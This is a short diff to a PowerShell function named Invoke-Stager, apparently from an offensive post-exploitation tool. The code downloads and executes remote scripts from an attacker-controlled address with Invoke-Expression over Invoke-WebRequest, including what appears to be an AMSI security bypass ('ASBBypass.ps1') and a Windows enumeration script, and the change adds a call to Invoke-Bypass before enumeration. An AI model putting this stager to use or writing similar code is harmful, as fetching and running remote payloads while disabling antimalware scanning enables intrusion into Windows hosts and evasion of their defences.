@@ -18,7 +18,7 @@ function Invoke-Stager{
     }
     if(-not($check)){
         try{
-            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri "$Address/ASBBypass.ps1").content  | Out-Null
+            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri "$Address/ASBBypass.ps1").content
             Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri "$Address/Invoke-WinEnum.ps1").content 
         }catch{
             Write-Output "[-] $($_.Exception.Message)"
@@ -26,6 +26,7 @@ function Invoke-Stager{
             return
         }
     }
+    Invoke-Bypass | Out-Null
     Invoke-WinEnum
 }
 Invoke-Stager
